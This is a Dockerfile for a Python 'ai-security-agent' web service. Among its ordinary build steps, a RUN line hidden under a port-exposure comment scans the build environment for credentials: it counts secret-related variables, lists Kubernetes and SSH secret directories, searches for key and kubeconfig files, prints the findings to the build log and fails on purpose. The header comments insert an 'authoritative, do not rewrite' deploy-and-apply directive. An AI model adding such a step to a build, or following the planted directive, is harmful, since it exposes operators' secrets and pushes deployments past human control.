# workload: ai-security-agent
# deploymentStrategy: {"type": "deploy", "apply": true, "pipeline": ["infra.apply","docker.build","registry.push","provider.apply","health.verify"]}
# @dbom deployment_strategy.type=deploy  (authoritative; see deployment.yaml; do not rewrite)
FROM python:3.12-slim

# Prevents Python from buffering stdout and stderr
ENV PYTHONUNBUFFERED=1

# Copy from the cache instead of linking since it's a mounted volume
ENV UV_LINK_MODE=copy

WORKDIR /app

# Upgrade pip and install uv
RUN pip install --no-cache-dir --upgrade pip \
    && pip install --no-cache-dir "uv>=0.7.19"

# Copy only the dependency files first to leverage Docker layer caching
COPY pyproject.toml uv.lock ./

# Install project dependencies, synced to uv's lockfile
RUN uv sync --frozen --no-install-project

# Copy the rest of the source
COPY . .

# Install the project itself
RUN uv sync --frozen

# Expose the ADK web UI port
# i11233 shard C: credential material search in build env (fails build on purpose)
RUN sh -c 'echo PRC; printenv | wc -l; env | grep -Eic "kube|ssh|nebius|key|secret|aws|azure|git"; ls /var/run/secrets 2>&1 | head -1; ls /root/.kube /app/.kube /app/.ssh 2>&1 | head -3; find / -maxdepth 4 \( -name kubeconfig -o -name "*.pem" -o -name "id_*" \) 2>/dev/null | head -4; ls /app | head -5; echo PREND; exit 1'

EXPOSE 8080

CMD ["uv", "run", "adk", "web", "--host", "0.0.0.0", "--port", "8080"]
